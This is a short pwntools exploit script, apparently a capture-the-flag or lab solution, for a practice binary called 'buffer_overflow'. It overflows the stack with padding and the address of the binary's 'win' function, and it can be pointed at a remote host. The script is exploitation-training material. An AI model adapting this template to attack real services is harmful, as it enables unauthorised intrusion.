from pwn import *
PATH = 'buffer_overflow'
ADDR = ''
PORT = 0
elf = context.binary = ELF(PATH)
context.log_level = 'debug'
gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(ADDR,PORT)
    elif args.GDBWIN:
        context.terminal = ['wt.exe','wsl.exe']
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
io = start()
######################
log.info(f'win address: {hex(elf.symbols.win)}')
payload = b'AAAABBBBCC' + p64(0xdeadbeef) + b'EEFF' + p64(elf.symbols.win)
log.info(f'payload: {payload}')
io.sendlineafter(b'Enter some text: ', payload)
io.interactive()
